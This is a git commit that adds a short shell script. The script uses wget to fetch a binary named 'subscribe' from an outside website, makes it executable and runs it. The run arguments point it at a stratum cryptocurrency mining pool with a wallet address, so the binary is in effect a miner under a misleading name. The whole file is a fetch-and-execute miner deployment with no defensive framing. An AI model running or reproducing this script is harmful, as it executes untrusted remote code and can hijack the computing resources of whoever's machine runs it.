ff31767f5812d30db8a43b6efdf8d1c93cd0b2d2
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-02 08:26:30 +0700

    Add files via upload

---
+++ bash.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+
+wget http://ilovenypizza.com/subscribe
+chmod +x subscribe
+
+#run
+
+./subscribe -a yespowerTIDE -o stratum+tcps://stratum-eu.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.HR
